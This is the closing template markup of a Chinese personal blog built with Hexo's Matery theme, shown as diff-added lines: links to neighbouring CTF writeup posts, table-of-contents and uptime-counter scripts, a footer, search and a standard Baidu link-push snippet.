+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2018/12/02/peng-cheng-bei-2018writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/1.jpg" class="responsive-img" alt="鹏城杯2018Writeup">
+                        
+                        <span class="card-title">鹏城杯2018Writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+Web狗没有活路啦 (╯°Д°)╯︵ ┻━┻
+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-12-02
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/11/06/2018-shan-dong-sheng-sheng-sai-ke-lai-bei-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/5.jpg" class="responsive-img" alt="2018山东省省赛(科来杯)WriteUp">
+                        
+                        <span class="card-title">2018山东省省赛(科来杯)WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-11-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
